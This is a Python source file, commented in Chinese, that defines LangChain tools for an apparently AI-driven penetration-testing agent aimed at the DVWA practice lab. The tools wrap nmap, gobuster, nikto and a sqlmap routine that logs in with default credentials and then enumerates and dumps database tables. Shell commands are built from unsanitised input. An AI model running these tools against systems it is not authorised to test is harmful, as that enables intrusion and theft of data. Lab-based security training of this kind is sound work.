from langchain.tools import tool
from utils.exec_tool import run_tool
import requests, re, os
from bs4 import BeautifulSoup

# 从环境变量读取全局 Cookie（可选）
GLOBAL_COOKIE = os.getenv("TARGET_COOKIE", "")

def _dvwa_auto_login(base_url="http://localhost/DVWA"):
    login_url = f"{base_url}/login.php"
    sess = requests.Session()
    try:
        resp = sess.get(login_url, timeout=10)
        resp.raise_for_status()
    except Exception as e:
        return None, f"登录失败：{e}"
    
    soup = BeautifulSoup(resp.text, 'html.parser')
    token_input = soup.find('input', {'name': 'user_token'})
    if not token_input:
        return None, "未找到 CSRF token"
    user_token = token_input.get('value', '')
    
    login_data = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login',
        'user_token': user_token
    }
    try:
        resp = sess.post(login_url, data=login_data, timeout=10)
        resp.raise_for_status()
    except Exception as e:
        return None, f"登录请求失败：{e}"
    
    phpsessid = sess.cookies.get('PHPSESSID')
    if not phpsessid:
        return None, "未获取到 PHPSESSID"
    return f"security=low; PHPSESSID={phpsessid}", None

@tool
def nmap_scan(target: str) -> str:
    """
    端口扫描和服务版本探测。
    输入: target 格式如 '127.0.0.1' 或 'localhost'
    """
    cmd = f"nmap -sV -sC -p 1-10000 {target}"
    return run_tool(cmd, timeout=120)

@tool
def gobuster_dir(target_url: str) -> str:
    """
    Web 目录/文件爆破。
    输入: target_url 格式如 'http://localhost/DVWA'
    """
    cmd = f"gobuster dir -u {target_url} -w /usr/share/wordlists/dirb/common.txt -q"
    return run_tool(cmd, timeout=90)

@tool
def sqlmap_test(url: str) -> str:
    """
    全自动 SQL 注入检测与拖库。
    支持 DVWA 自动登录，或使用环境变量 TARGET_COOKIE 提供的自定义 Cookie。
    输入: 完整的注入点 URL
    """
    cookie = ""
    if "DVWA" in url or "dvwa" in url:
        # DVWA 自动登录
        base = "http://localhost/DVWA"
        cookie, err = _dvwa_auto_login(base)
        if err:
            return f"[Error] 自动登录失败: {err}"
    elif GLOBAL_COOKIE:
        cookie = GLOBAL_COOKIE
    # 否则不带 cookie，适合无需认证的靶场
    
    results = []
    cmd_dbs = f"sqlmap -u \"{url}\" --cookie=\"{cookie}\" --batch --level=2 --risk=2 --dbs"
    out_dbs = run_tool(cmd_dbs, timeout=180)
    results.append("=== 数据库检测 ===")
    results.append(out_dbs)
    
    db_match = re.search(r'\*\*\s+\S+\s+\[(\w+)\]', out_dbs)
    if not db_match:
        db_match = re.search(r'database\s+`?(\w+)`?', out_dbs, re.IGNORECASE)
    db_name = db_match.group(1) if db_match else "dvwa"
    
    cmd_tables = f"sqlmap -u \"{url}\" --cookie=\"{cookie}\" --batch --level=2 --risk=2 -D {db_name} --tables"
    out_tables = run_tool(cmd_tables, timeout=180)
    results.append(f"\n=== 数据库 {db_name} 的表 ===")
    results.append(out_tables)
    
    table_match = re.search(r'(\w+)\s+table', out_tables)
    if not table_match:
        table_match = re.search(r'users', out_tables, re.IGNORECASE)
        table_name = "users" if table_match else "users"
    else:
        table_name = table_match.group(1)
    
    cmd_dump = f"sqlmap -u \"{url}\" --cookie=\"{cookie}\" --batch --level=2 --risk=2 -D {db_name} -T {table_name} --dump"
    out_dump = run_tool(cmd_dump, timeout=180)
    results.append(f"\n=== {db_name}.{table_name} 数据 ===")
    results.append(out_dump)
    
    return "\n".join(results)

@tool
def nikto_scan(target_url: str) -> str:
    """
    使用 nikto 对目标 Web 服务进行漏洞扫描。
    输入: target_url 格式如 'http://localhost:80'
    """
    cmd = f"nikto -h {target_url} -Tuning 1,2,3,4,5"
    return run_tool(cmd, timeout=180)

TOOLS = [nmap_scan, gobuster_dir, sqlmap_test, nikto_scan]
